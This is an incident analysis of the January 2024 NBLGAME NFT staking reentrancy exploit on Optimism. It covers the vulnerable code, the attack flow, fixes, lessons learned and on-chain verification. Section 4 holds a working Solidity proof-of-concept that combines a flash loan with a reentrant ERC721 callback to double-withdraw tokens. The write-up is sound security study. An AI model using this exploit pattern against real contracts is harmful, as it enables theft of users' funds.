# NBLGAME — NFT Staking Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-25 |
| **Protocol** | NBLGAME (NblNftStake) |
| **Chain** | Optimism |
| **Loss** | ~$180,435 (USDT $164,967 + WETH $15,467) |
| **Attacker** | [0x1FD0...ef12](https://optimistic.etherscan.io/address/0x1fd0a6a5e232eeba8020a40535ad07013ec4ef12) |
| **Attack Contract** | [0xE4D4...087b](https://optimistic.etherscan.io/address/0xe4d41bdd6459198b33cc795ff280cee02d91087b) |
| **Attack Tx** | [0xf4fc...2328](https://optimistic.etherscan.io/tx/0xf4fc3b638f1a377cf22b729199a9aeb27fc62fe2983a65c4d14b99ee5c5b2328) |
| **Vulnerable Contract** | [0x5499...4D91](https://optimistic.etherscan.io/address/0x5499178919c79086fd580d6c5f332a4253244d91) |
| **Root Cause** | Missing `nonReentrant` on `withdrawNft()` — reentrancy via ERC721 callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/NBLGAME_exp.sol) |

---

## 1. Vulnerability Overview

The NBLGAME NFT staking contract (`NblNftStake`) uses ERC721's `safeTransferFrom` when transferring NFTs in the `withdrawNft()` function. This function triggers an `onERC721Received()` callback when the recipient is a contract, yet `withdrawNft()` had no reentrancy guard (`nonReentrant`).

The attacker exploited the fact that the staking contract's state had not yet been cleared at the point of the callback, re-entering `withdrawNft()` for the same slot (index 0) to withdraw NBL tokens twice. Initial NBL was obtained via a Uniswap V3 flash loan, and the withdrawn NBL was swapped to USDT and WETH, netting approximately $180K.

---

## 2. Vulnerable Code Analysis

### 2.1 `withdrawNft()` — Reentrancy Vulnerability (Core)

**Vulnerable code (reconstructed)**:
```solidity
// ❌ No nonReentrant modifier — reentrancy possible via ERC721 callback
function withdrawNft(uint256 _index) external {
    StakeInfo storage info = stakeInfos[msg.sender][_index];
    require(info.nftTokenId != 0, "Slot is empty");

    uint256 tokenId = info.nftTokenId;

    // ❌ External call before state reset (CEI pattern violation)
    // NBL token reward or deposit refund
    uint256 nblAmount = info.nblAmount;
    NBL.transfer(msg.sender, nblAmount);   // ❌ External call 1 before state change

    // ❌ safeTransferFrom triggers onERC721Received() callback
    // At this point stakeInfos has not yet been cleared
    NBF.safeTransferFrom(address(this), msg.sender, tokenId); // ❌ Callback reentrancy point

    // Even though NBL was already sent above during reentrancy, this code has not yet executed
    info.nftTokenId = 0;   // Too late — only runs after reentrancy
    info.nblAmount = 0;    // Too late
}
```

**Fixed code**:
```solidity
// ✅ nonReentrant modifier applied
// ✅ CEI (Checks-Effects-Interactions) pattern followed
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function withdrawNft(uint256 _index) external nonReentrant {
    StakeInfo storage info = stakeInfos[msg.sender][_index];
    require(info.nftTokenId != 0, "Slot is empty");

    uint256 tokenId = info.nftTokenId;
    uint256 nblAmount = info.nblAmount;

    // ✅ Effects first: reset state before external calls
    info.nftTokenId = 0;
    info.nblAmount = 0;

    // ✅ Interactions last: external calls after state changes are complete
    NBL.transfer(msg.sender, nblAmount);
    NBF.safeTransferFrom(address(this), msg.sender, tokenId);
}
```

**Issue**: `withdrawNft()` lacks `nonReentrant` and violates the CEI pattern, causing external calls (NBL transfer + NFT safeTransfer) to execute before state is cleared. When the attacker re-enters via the `onERC721Received()` callback, the staking info is still valid, allowing the same NBL balance to be withdrawn again.

---

### 2.2 `depositNbl()` — Establishing the Reentrancy Precondition

```solidity
// Attacker deposits NBL borrowed via flash loan into slot 0
// When withdrawNft() is called afterward, nblAmount is sufficiently funded
function depositNbl(uint256 _index, uint256 _amount) external {
    StakeInfo storage info = stakeInfos[msg.sender][_index];
    require(info.nftTokenId != 0, "NFT must be deposited first");
    NBL.transferFrom(msg.sender, address(this), _amount);
    info.nblAmount += _amount;  // This value remains intact during reentrancy
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA `0x1FD0...ef12` pre-deployed two attack contracts:
  - Main attack contract: `0xE4D4...087b` (holds NBF NFT #737)
  - Helper attack contract: `0xfc3b...ba4c` (contains reentrancy logic, selfdestructs after attack)
- NFT #737 transferred from the main contract to the helper contract (to execute the reentrancy attack)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────┐
│  Attacker EOA: 0x1FD0...ef12                                 │
│  Helper Attack Contract: 0xfc3b...ba4c                       │
└──────────────────────┬──────────────────────────────────────┘
                       │ ① Transfer NFT #737 (mainContract → helperContract)
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  NBL_USDT Uniswap V3 Pool: 0xfAF0...3613                    │
│  flash(helperContract, NBL.balanceOf(NblNftStake), 0, "")   │
└──────────────────────┬──────────────────────────────────────┘
                       │ ② Flash loan: borrow entire NBL balance of NblNftStake
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  uniswapV3FlashCallback() executes                           │
│  ├─ Set approvals (Router, NblNftStake)                      │
│  ├─ NblNftStake.unlockSlot()          ③ Open slot           │
│  ├─ NblNftStake.depositNft(737, 0)    ④ Deposit NFT         │
│  ├─ NblNftStake.depositNbl(0, amount) ⑤ Deposit all NBL     │
│  └─ NblNftStake.withdrawNft(0)        ⑥ Call vulnerable fn ←──┐  │
└──────────────────────┬──────────────────────────────────────┘
                       │ ⑦ NBL transferred, then safeTransferFrom(NFT #737) executes
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  onERC721Received() callback (reentrancy trigger)            │
│  [reenter = true → first reentry]                            │
│  ├─ reenter = false  (prevent further reentry)               │
│  ├─ NBF.transferFrom(self → NblNftStake, NFT #737)           │
│  │    ⑧ Send NFT back to staking contract                    │
│  ├─ NblNftStake.withdrawNft(0)  ──────────────────────────┘  │
│  │    ⑨ Reentry: stakeInfo still valid → withdraw NBL again  │
│  └─ NblNftStake.depositNft(737, 0)                           │
│       ⑩ Re-deposit NFT (restore state for original withdrawNft to complete) │
└──────────────────────┬──────────────────────────────────────┘
                       │ ⑪ Original withdrawNft() completes — NFT retrieved
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Repay flash loan (returnAmount + fee0 → NBL_USDT Pool)      │
│  Swap NBL → USDT (90% of balance, Uniswap V3)               │
│  Swap NBL → WETH (remainder, Uniswap V3)                     │
└─────────────────────────────────────────────────────────────┘
                       │
                       ▼
        Attacker profit: USDT $164,967 + WETH $15,467 ≈ $180,435
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Attacker USDT profit | $164,967.66 |
| Attacker WETH profit | $15,467.69 |
| **Total Loss** | **~$180,435** |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Core reentrancy attack flow

contract ContractTest is Test {
    // ...key constants and state variables...
    bool private reenter = true; // Reentrancy control flag

    function testExploit() public {
        // [Step 1] Receive NFT #737 from the main attack contract
        // vm.prank: execute with mainAttackContract permissions
        vm.prank(mainAttackContract, exploiterEOA);
        NBF.transferFrom(mainAttackContract, address(this), 737);

        // [Step 2] Uniswap V3 flash loan: borrow entire NBL balance of NblNftStake
        // fee0 is the loan fee, must be repaid in the callback
        NBL_USDT.flash(address(this), NBL.balanceOf(address(NblNftStake)), 0, "");

        // [Step 7] Convert acquired NBL to USDT and WETH for profit
        NBLToUSDT(); // 90% of NBL → USDT
        NBLToWETH(); // Remaining NBL → WETH
    }

    // [Step 3] Flash loan callback: core attack logic
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // Set approvals for staking contract
        USDT.approve(address(Router), type(uint256).max);
        NBL.approve(address(NblNftStake), type(uint256).max);
        uint256 returnAmount = NBL.balanceOf(address(NblNftStake));

        NBF.setApprovalForAll(address(NblNftStake), true);
        NblNftStake.unlockSlot();                          // Open slot
        NblNftStake.depositNft(737, 0);                    // Deposit NFT into slot 0
        NblNftStake.depositNbl(0, NBL.balanceOf(address(this))); // Deposit all NBL

        // ← Call vulnerable function: no nonReentrant
        // withdrawNft() transfers NBL then triggers onERC721Received()
        // callback via NFT safeTransferFrom
        NblNftStake.withdrawNft(0); // ← Reentrancy attack entry point

        // Repay flash loan
        NBL.transfer(address(NBL_USDT), returnAmount + fee0);
    }

    // [Step 5] ERC721 receive callback: perform reentrancy
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (reenter) {
            reenter = false; // Prevent infinite loop: reenter only once

            // Send NFT back to staking contract to make slot appear valid
            NBF.transferFrom(address(this), address(NblNftStake), 737);

            // Reentry: stakeInfos[msg.sender][0] not yet cleared
            // → Withdraw NBL balance again (double withdrawal)
            NblNftStake.withdrawNft(0);

            // Re-deposit NFT to restore state so original withdrawNft() can complete
            NblNftStake.depositNft(737, 0);
        }
        return this.onERC721Received.selector;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | ERC721 callback reentrancy (`withdrawNft` missing `nonReentrant`) | CRITICAL | CWE-841 |
| V-02 | CEI pattern violation (external call before state change) | HIGH | CWE-362 |
| V-03 | Flash loan available for initial capital sourcing | MEDIUM | CWE-400 |

### V-01: ERC721 Callback Reentrancy

- **Description**: The `withdrawNft()` function lacks a `nonReentrant` modifier, enabling reentrancy via the `onERC721Received()` callback triggered by `safeTransferFrom`.
- **Impact**: An attacker can double-withdraw NBL tokens from the same slot, draining the protocol's entire NBL balance.
- **Attack Condition**: The attacker must stake through a contract implementing `onERC721Received()` and be able to call `withdrawNft()`.

### V-02: CEI Pattern Violation

- **Description**: Violates the Checks-Effects-Interactions pattern by executing token transfers and NFT safeTransfer external calls before clearing the staking state (`stakeInfos`).
- **Impact**: During reentrancy, stakeInfo still appears valid, allowing the same resources to be consumed again.
- **Attack Condition**: Combined with the V-01 reentrancy vulnerability, leads to actual fund loss.

### V-03: Flash Loan Combined Attack

- **Description**: An attacker need not hold large amounts of NBL directly; they can obtain initial capital via a Uniswap V3 flash loan to use in `depositNbl()`.
- **Impact**: Lowers the barrier to entry, enabling large-scale attacks with minimal capital.
- **Attack Condition**: Requires a V3 Pool with sufficient NBL token liquidity.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Add nonReentrant (inherit OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract NblNftStake is ReentrancyGuard {

    // ✅ Add nonReentrant to withdrawNft
    function withdrawNft(uint256 _index) external nonReentrant {
        StakeInfo storage info = stakeInfos[msg.sender][_index];
        require(info.nftTokenId != 0, "Empty slot");

        uint256 tokenId = info.nftTokenId;
        uint256 nblAmount = info.nblAmount;

        // ✅ Fix 2: CEI pattern — Effects first
        info.nftTokenId = 0;
        info.nblAmount = 0;

        // ✅ Interactions last
        if (nblAmount > 0) {
            NBL.transfer(msg.sender, nblAmount);
        }
        // ✅ Consider using transferFrom instead of safeTransferFrom
        // (transferFrom has no callback, eliminating the reentrancy vector)
        NBF.transferFrom(address(this), msg.sender, tokenId);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Reentrancy | Apply `nonReentrant` to all withdrawal functions; consider switching `safeTransferFrom` → `transferFrom` |
| V-02: CEI Violation | Complete all state changes before any external calls (strict Checks → Effects → Interactions) |
| V-03: Flash Loan | Introduce a block delay to prevent `depositNbl()` and `withdrawNft()` from being called within the same block |
| General | Run Slither/Echidna static/fuzz analysis on the entire staking contract |
| General | Require code review by a professional audit firm before deployment |

---

## 7. Lessons Learned

1. **ERC721/ERC1155 callbacks are reentrancy vectors**: `safeTransferFrom`, `safeMint`, and `safeTransfer` invoke callbacks on recipient contracts. Every function that returns an NFT must mandatorily apply `nonReentrant`.

2. **CEI pattern is non-negotiable**: All state variables must be updated before any external calls (token transfers, NFT transfers, external contract calls). In particular, the "clean up state after withdrawal" pattern is always dangerous.

3. **Flash loans neutralize capital constraints**: A reentrancy vulnerability alone can cause significant losses, but when combined with a flash loan, the attack scale expands to the contract's entire balance. Withdrawal logic must be reviewed with a flash loan environment in mind.

4. **Dual attack contract (helper) pattern**: In the actual attack, the attacker separated the NFT-holding main contract from the helper contract performing the reentrancy callback to increase complexity. The attack contract removed evidence via `selfdestruct`.

5. **Staking protocol audit checklist**: Every withdraw, claim, and unstake function must be verified for (1) `nonReentrant`, (2) CEI ordering, and (3) ERC721/ERC1155 callback vectors.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amounts Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|-------------|------|
| Total loss | ~$180K | ~$180,435 | ✅ |
| Attacker USDT profit | — | $164,967.66 | ✅ |
| Attacker WETH profit | — | $15,467.69 (6.90 WETH) | ✅ |
| Block number | 115,293,068 (fork) | 115,293,069 (actual) | ✅ (fork+1) |
| Attacker address | 0x1FD0...ef12 | 0x1FD0...ef12 | ✅ |
| Attack contract | 0xE4D4...087b | 0xE4D4...087b | ✅ |

### 8.2 On-Chain Event Log Sequence

45 event logs recorded in total:
1. USDT, NBL approve events (staking contract, router)
2. NBF NFT #737 Transfer: `mainContract → helperContract`
3. Flash event: `NBL_USDT Pool → helperContract` (entire NBL balance)
4. NBF NFT #737 Transfer: `helperContract → NblNftStake` (depositNft)
5. NBL Transfer: `helperContract → NblNftStake` (depositNbl)
6. NBL Transfer: `NblNftStake → helperContract` (withdrawNft 1st pass)
7. NBF NFT #737 Transfer: `NblNftStake → helperContract` (withdrawNft safeTransfer → callback triggered)
8. NBF NFT #737 Transfer: `helperContract → NblNftStake` (re-send within callback)
9. NBL Transfer: `NblNftStake → helperContract` (reentrant withdrawNft 2nd pass)
10. NBF NFT #737 Transfer: `helperContract → NblNftStake` (depositNft re-deposit)
11. NBF NFT #737 Transfer: `NblNftStake → helperContract` (original withdrawNft completes)
12. NBL Transfer: flash loan repayment (`helperContract → NBL_USDT Pool`)
13. NBL → USDT swap (Uniswap V3)
14. NBL → WETH swap (Uniswap V3)
15. USDT/WETH Transfer: `helperContract → Attacker EOA`
16. helperContract selfdestruct

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| Attack block | 115,293,069 (2024-01-25 12:15:15 UTC) |
| NblNftStake NBL balance before attack | Sufficient (flash loan target) |
| NFT #737 ownership | Pre-acquired by mainAttackContract |
| selfdestruct | helperContract auto-destructed after attack |
| Analysis sources | Referenced SlowMist, AnciliaInc Twitter analyses |